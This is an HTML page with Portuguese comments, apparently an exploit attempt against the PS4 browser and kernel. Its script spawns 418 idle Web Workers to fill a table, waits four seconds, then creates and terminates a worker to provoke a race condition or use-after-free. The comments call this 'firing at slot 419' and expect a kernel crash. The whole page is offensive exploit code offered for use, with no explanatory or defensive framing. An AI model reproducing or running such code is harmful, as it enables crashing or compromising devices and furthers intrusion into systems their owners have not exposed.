<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 Sniper Delay (4s)</title>
    <style>
        body { 
            background-color: #000; 
            color: #fff; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            padding: 20px;
            display: flex; flex-direction: column; justify-content: center; height: 90vh;
        }
        h1 { margin: 0; font-size: 2em; color: #0f0; text-shadow: 0 0 10px #0f0; }
        #counter { font-size: 8em; font-weight: bold; margin: 20px 0; color: #fff; }
        #status { font-size: 1.5em; border: 1px solid #555; padding: 15px; background: #111; color: #888; }
        
        .countdown { color: #ff0 !important; font-size: 2em !important; border-color: #ff0 !important; }
        .attack { background-color: #500 !important; color: #fff !important; border-color: #f00 !important; animation: pulse 0.2s infinite; }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <h1>SNIPER DELAY</h1>
    <div id="status">ENCHENDO TABELA...</div>
    <div id="counter">0</div>

    <script>
        // CONFIGURAÇÃO FINA
        const TARGET_HOVER = 418;  // Onde paramos
        const WAIT_TIME_MS = 4000; // 4 Segundos de espera (Sua ideia)
        
        let workers = [];
        // Worker Passivo (Enchimento)
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        // Worker Kamikaze (O Disparo)
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function updateDisplay() {
            document.getElementById('counter').innerText = workers.length;
        }

        // FASE 1: Subida
        function startClimb() {
            let i = setInterval(() => {
                // Sobe rápido até 400
                if (workers.length < 400) {
                    for(let k=0; k<5; k++) workers.push(new Worker(url));
                } 
                // Sobe devagar (1 por vez) até 418
                else if (workers.length < TARGET_HOVER) {
                    workers.push(new Worker(url));
                } 
                // Chegou em 418: PARA TUDO E ESPERA
                else {
                    clearInterval(i);
                    updateDisplay();
                    startCountdown();
                    return;
                }
                updateDisplay();
            }, 50);
        }

        // FASE 2: O Aguardo (4 Segundos)
        function startCountdown() {
            const status = document.getElementById('status');
            status.className = "countdown";
            
            let timeLeft = WAIT_TIME_MS / 1000;
            status.innerText = `ALVO 418. AGUARDANDO ${timeLeft.toFixed(1)}s...`;
            
            const timer = setInterval(() => {
                timeLeft -= 0.1;
                status.innerText = `ALVO 418. AGUARDANDO ${timeLeft.toFixed(1)}s...`;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    fireShot();
                }
            }, 100);
        }

        // FASE 3: O Disparo (Sniper Shot)
        function fireShot() {
            const status = document.getElementById('status');
            status.className = "attack";
            status.innerText = ">>> DISPARANDO NO SLOT 419 <<<";

            // Tentativa ÚNICA e PRECISA de Race Condition
            // Tenta criar e destruir exatamente quando o Kernel deve estar "congelando"
            setTimeout(() => {
                try {
                    const w = new Worker(killerUrl); // Cria (Use)
                    w.terminate(); // Mata (Free)
                    
                    // Se não crashar imediatamente, tenta mais um leve toque
                    setTimeout(() => {
                         try { new Worker(killerUrl).terminate(); } catch(e){}
                    }, 100);
                    
                } catch(e) {
                    status.innerText = "KERNEL CHEIO (FALHA NO DISPARO)";
                }
            }, 50);
        }

        // Início
        setTimeout(startClimb, 2000);

    </script>
</body>
</html>
